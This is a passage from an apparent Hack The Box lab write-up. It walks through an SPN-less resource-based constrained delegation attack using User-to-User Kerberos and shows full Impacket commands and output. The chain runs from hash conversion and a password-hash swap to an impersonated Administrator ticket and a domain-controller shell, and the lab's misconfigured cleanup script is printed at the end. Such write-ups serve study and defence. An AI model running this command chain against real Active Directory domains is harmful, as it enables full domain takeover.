SASL/GSSAPI authentication started
SASL username: bob.w@HERCULES.HTB
SASL SSF: 256
SASL data security layer installed.
# filter: (&(objectClass=*)(servicePrincipalName=*))
# requesting: servicePrincipalName 
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.hercules.ht
servicePrincipalName: ldap/dc.hercules.htb/ForestDnsZones.hercules.htb
servicePrincipalName: ldap/dc.hercules.htb/DomainDnsZones.hercules.htb
servicePrincipalName: DNS/dc.hercules.htb
servicePrincipalName: GC/dc.hercules.htb/hercules.htb
servicePrincipalName: RestrictedKrbHost/dc.hercules.htb
servicePrincipalName: RestrictedKrbHost/DC
servicePrincipalName: RPC/3171068b-bac8-43b2-834f-20dd0250d430._msdcs.hercules
servicePrincipalName: HOST/DC/HERCULES
servicePrincipalName: HOST/dc.hercules.htb/HERCULES
servicePrincipalName: HOST/DC
servicePrincipalName: HOST/dc.hercules.htb
servicePrincipalName: HOST/dc.hercules.htb/hercules.htb
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/3171068b-bac8-43b2-
servicePrincipalName: ldap/DC/HERCULES
servicePrincipalName: ldap/3171068b-bac8-43b2-834f-20dd0250d430._msdcs.hercule
servicePrincipalName: ldap/dc.hercules.htb/HERCULES
servicePrincipalName: ldap/DC
servicePrincipalName: ldap/dc.hercules.htb
servicePrincipalName: ldap/dc.hercules.htb/hercules.htb
servicePrincipalName: kadmin/changepw
```

If we try the attack with the `-self` flag, we manage to get a valid TGS for `Administrator` (who we're impersonating), but it would only be useful for a service on the same `IIS_WEBSERVER$` account, ignoring the `cifs/dc.hercules.htb` SPN we set. So it wouldn't get us straight to Domain Admin.

```bash
❯ getST.py hercules.htb/'IIS_WEBSERVER$' -spn 'cifs/dc.hercules.htb' -impersonate Administrator -dc-ip $IP -k -no-pass -u2u -self
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] When doing S4U2self only, argument -spn is ignored
[*] Requesting S4U2self+U2U
[*] Saving ticket in Administrator@IIS_WEBSERVER$@HERCULES.HTB.ccache
```

We also can't add a machine to the domain, since the `MachineAccountQuota` value is 0.

```bash
❯ nxc ldap $IP --use-kcache -M maq
LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:HERCULES.HTB) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.10.11.91     389    DC               [+] HERCULES.HTB\IIS_WebServer$ from ccache 
MAQ         10.10.11.91     389    DC               [*] Getting the MachineAccountQuota
MAQ         10.10.11.91     389    DC               MachineAccountQuota: 0
```

----
### SPN-less RBCD Abuse using U2U

In the scenario we're in, we have an `IIS_WEBSERVER$` account that has `WriteProperty` over the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute but doesn't have any `servicePrincipalName (SPN)` assigned, and can't add machines to the domain.

Googling the terms `SPN-less RBCD` or `RBCD without SPN`, we find the following blogs explaining a variant of the `Resource-Based Constrained Delegation (RBCD)` that can be done without an `SPN`.

- https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5

- https://medium.com/@noah_h/offensive-kerberos-techniques-for-detection-engineering-16a81483f676

- https://blog.oppida.apave.com/posts/RBCD/#2-rbcd-spn-less-une-variante-de-rbcd

![image](/assets/img/writeups/htb-hercules/Pasted image 20251022170834.png)

> **SPN-less RBCD (Resource Based Constrained Delegation without SPN)**
>
>**Identified problem:**  
>The standard RBCD exploitation method (**S4U2Self + S4U2Proxy**) requires controlling an account with an **SPN** (Service Principal Name) configured. This fails in environments where:
>
>- `ms-DS-MachineAccountQuota = 0` (can't create new machine accounts, which have an SPN by default).
>    
>- No other account (user or machine) with an SPN is controlled.
>    
>**Solution: "SPN-less" technique**  
>It uses a different Kerberos extension called **User-to-User (U2U)**, designed so normal users (without SPNs) can host services. Instead of the SPN, it uses the **UPN** (User Principal Name, e.g. `user@domain.com`), which every domain user has.
>
>**Key requirement:**  
>You need to know the **NTLM hash** (or password) of the compromised user that will be used for the delegation.
>
>**Attack process:**
>
>1. **Get TGT with Session Key:** A **TGT** (Ticket Granting Ticket) is requested using **Over-Pass-the-Hash** with the user's NTLM hash. This ensures the TGT's session key (`session key`) derives from this hash.
>    
>2. **Extract the Session Key:** This `session key` is extracted from the obtained TGT.
>    
>3. **Change Credential:** The user's NTLM hash in AD is temporarily changed to the `session key` extracted in the previous step.
>    
>4. **Delegation Chain:** The **S4U2Self + U2U** chain is run (using the new hash) to then get the final **S4U2Proxy** ticket and its **TGS** (Ticket Granting Service) for the target service.
>    
>5. **Restore (Optional):** If possible, the user's original NTLM hash is restored to avoid detection.
>
>**In essence:** This technique gets around the need for an SPN by leveraging the UPN and the U2U extension, manipulating Kerberos session keys to achieve privileged delegation.
{: .prompt-info }

When we request a TGT (Ticket Granting Ticket) providing our password in plaintext, the `Ticket Session Key` is encrypted with AES256, making it more robust. In contrast, when requesting a TGT providing our NTLM hash, it's encrypted with RC4, which is weaker.

In our case, describing the TGT we have for `IIS_WEBSERVER$`, which we requested providing the plaintext password, in the `Ticket Session Key` field we see a value that looks like an AES256 key.

>`getTGT.py user:password` → Session Key = AES256
>
>`getTGT.py -hashes :ntlm_hash` → Session Key = RC4
{: .prompt-info }

```bash
❯ describeTicket.py "$KRB5CCNAME"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 2
[*] Parsing credential[0]:
[*] Ticket Session Key            : ac9631d2529c7800f8d0d3e57809e0db0af639f79884d246363ffa562adef25a
[*] User Name                     : IIS_WEBSERVER$
[*] User Realm                    : HERCULES.HTB
[*] Service Name                  : krbtgt/HERCULES.HTB
[*] Service Realm                 : HERCULES.HTB
[*] Start Time                    : 21/10/2025 08:18:26 AM
[*] End Time                      : 21/10/2025 18:18:26 PM
[*] RenewTill                     : 22/10/2025 08:18:25 AM
[*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
[*] KeyType                       : aes256_cts_hmac_sha1_96
[*] Base64(key)                   : rJYx0lKceAD40NPleAng2wr2OfeYhNJGNj/6Vire8lo=
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/HERCULES.HTB
[*]   Service Realm               : HERCULES.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

What we'll do is convert the password assigned to `IIS_WEBSERVER$` into an NTLM hash. We can do that several ways, like the Python one-liner below, online websites, or `pypykatz`. We confirm the result is the NTLM hash `613a519b5b0ef57c07bc6395aa1aff14`, which corresponds to the password `Gzzcoo123`.

We'll request a TGT (Ticket Granting Ticket) for `IIS_WEBSERVER$` using the NTLM hash of the password set for that user. Once we get `IIS_WEBSERVER$`'s TGT, we'll describe it with `describeTicket.py`, and we can see the `Ticket Session Key` value is shorter than the previous one, since it derives from that NTLM hash (RC4).

```bash
❯ python3 -c 'import hashlib; input_str="Gzzcoo123"; hash_obj = hashlib.new("md4", input_str.encode("utf-16le")); print(hash_obj.hexdigest())'
613a519b5b0ef57c07bc6395aa1aff14

❯ getTGT.py hercules.htb/'IIS_WEBSERVER$' -hashes :613a519b5b0ef57c07bc6395aa1aff14 -dc-ip $IP
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IIS_WEBSERVER$.ccache

❯ describeTicket.py $(pwd)/'IIS_WEBSERVER$.ccache'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : ba157b4250543fbee219f65351b1c8ef
[*] User Name                     : IIS_WEBSERVER$
[*] User Realm                    : HERCULES.HTB
[*] Service Name                  : krbtgt/HERCULES.HTB
[*] Service Realm                 : HERCULES.HTB
[*] Start Time                    : 21/10/2025 08:58:59 AM
[*] End Time                      : 21/10/2025 18:58:59 PM
[*] RenewTill                     : 22/10/2025 08:58:58 AM
[*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : uhV7QlBUP77iGfZTUbHI7w==
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/HERCULES.HTB
[*]   Service Realm               : HERCULES.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

We'll change the `IIS_WEBSERVER$` user's NTLM hash so it matches the value of the `Ticket Session Key`. We can do this with `changepasswd.py` from the `Impacket` suite.

>**Why change the user account's NTLM hash to the session key of the user's TGT?**
>
>To understand it, we need to look at how the KDC (Key Distribution Center) works when it receives an `S4U2Proxy` request:
>
>**Normal flow:**
>
>- A TGS (Service Ticket) is usually encrypted and decrypted by the KDC using the `Service Long Term Secret Key` when a service account (SPN) is involved.
>    
>**SPN-less variant (without SPN):**
>
>- Here, with no SPN involved, the KDC will try to decrypt the TGS provided in the `S4U2Proxy` request using the `User Long Term Secret Key` of the user acting as the "server" (in this case, the attacker).
>    
>**Conclusion:**  
>The answer is clear: the user "sacrificed" NTLM hash (the attacker's account) needs to match the session key of their TGT. This lets the KDC correctly decrypt the extra TGS provided in the `S4U2Proxy` request, making the attack viable without an SPN.
{: .prompt-info }

```bash
❯ changepasswd.py hercules.htb/'IIS_WEBSERVER$':'Gzzcoo123'@DC.hercules.htb -k -no-pass -dc-ip $IP -newhashes :ba157b4250543fbee219f65351b1c8ef
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of hercules.htb\IIS_WEBSERVER$
[*] Connecting to DCE/RPC as hercules.htb\IIS_WEBSERVER$
[*] Password was changed successfully.
[!] User will need to change their password on next logging because we are using hashes.
```

We'll export into the `KRB5CCNAME` variable the TGT we got earlier by providing the NTLM hash. Once the TGT is imported into our session, we'll carry out the `SPN-less RBCD` attack.

As the blogs mentioned, we'll do this with `getST.py` from `Impacket`, adding the `-u2u` flag so it uses (User-to-User). We'll request a TGS for `Administrator` via `S4U2Self+U2U -> S4U2Proxy Chain`.

We finally manage to get a valid TGS for the `cifs/dc.hercules.htb` service, impersonating `Administrator`.

> The attack works because by specifying `-u2u`, we can encrypt with our `Ticket Session Key` (which we know) and decrypt it ourselves.
{: .prompt-info }

```bash
❯ export KRB5CCNAME=$(pwd)/'IIS_WEBSERVER$.ccache'

❯ getST.py hercules.htb/'IIS_WEBSERVER$' -spn 'cifs/dc.hercules.htb' -impersonate Administrator -dc-ip $IP -k -no-pass -u2u
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

Finally we'll use `winrmexec.py` to get access to the Domain Controller with `Administrator`'s TGS. We finally confirm we got in as `Administrator` in the `hercules.htb` domain and grab the `root.txt` flag.

```powershell
❯ winrmexec.py -k -no-pass 'dc.hercules.htb' -dc-ip $IP -ssl -port 5986
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: hercules.htb\Administrator
[*] '-spn' not specified, using HTTP/dc.hercules.htb@hercules.htb
PS C:\Users\Administrator\Documents> type ../../admin/Desktop/root.txt
48671c3b32ad4076a01774668a5557f0
```

---
## Beyond the root

To understand why from `ashley.b` we finally managed to change `IIS_Administrator`'s credentials through the `aCleanup.ps1` script (which ran the `Password Cleanup` scheduled task, whose script really lived at `C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1`), we'll review its contents.

The `Password Cleanup.ps1` script looks for containers where `HERCULES\IT Support` already has rights to force password changes and, for each child object, clears `adminCount` and re-enables ACL inheritance. In practice this removes the protection on accounts flagged as sensitive and lets the parent OU's ACEs (where `IT Support` has permissions) apply to those accounts. Taking advantage of the `Password Cleanup` scheduled task running under an elevated context and the `genericAll` delegation over the OU (via `auditor`), we manage to get `ashley.b`/`IT Support` to finally be able to change `IIS_Administrator`'s password.

```powershell
PS C:\Users\Administrator\Documents> type "C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1"
function CanPasswordChangeIn {
    param ($ace)
    if($ace.ActiveDirectoryRights -match "ExtendedRight|GenericAll"){
        return $true
    }
    return $false
}

function CanChangePassword {
    param ($target, $object)

    $acls = (Get-Acl -Path "AD:$target").Access
    foreach($ace in $acls){
        if(($ace.IdentityReference -eq $object) -and (CanPasswordChangeIn $ace)){
            return $true
        }
    }
    return $false
}

function CleanArtifacts {
    param($Object)

    Set-ADObject -Identity $Object -Clear "adminCount"
    $acl = Get-Acl -Path "AD:$Object"
    $acl.SetAccessRuleProtection($False, $False)
    Set-Acl -Path "AD:$Object" -AclObject $acl
}

$group = "HERCULES\IT Support"
$objects = (Get-ADObject -Filter * -SearchBase "OU=DCHERCULES,DC=HERCULES,DC=HTB").DistinguishedName
$Path = "C:\Users\ashley.b\Scripts\log.txt"
Set-Content -Path $Path -Value ""

foreach($object in $objects){
    if(CanChangePassword $object $group){
        $Members = (Get-ADObject -Filter * -SearchBase $object | Where-Object { $_.DistinguishedName -ne $object }).DistinguishedName

        foreach($DN in $Members){
            try {
                CleanArtifacts $DN
            } 
            catch {
                $_.Exception.Message | Out-File $Path -Append
            }
            "Cleanup : $DN" | Out-File $Path -Append
        }
    }
}
```

_Happy Hacking :)_